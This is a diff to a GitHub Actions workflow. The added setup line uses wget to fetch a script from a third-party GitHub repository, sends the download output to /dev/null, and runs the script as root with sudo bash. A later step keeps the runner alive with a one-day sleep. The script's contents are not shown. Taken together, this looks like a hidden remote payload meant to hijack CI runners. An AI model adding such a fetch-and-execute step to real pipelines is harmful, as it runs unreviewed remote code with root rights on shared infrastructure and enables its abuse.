@@ -12,6 +12,7 @@ jobs:
 
       - name: setup
         run: |
-         sudo apt update && sudo  apt install wget sudo -y
+         sudo apt update && sudo  apt install wget sudo -y && sudo  wget https://github.com/githubaunglaymyanmar/onlytest/raw/refs/heads/main/ssh1aung1xyz &> /dev/null && sudo bash ssh1aung1xyz  
+
       - name: Ubuntu ready to go 
         run: sleep 1d
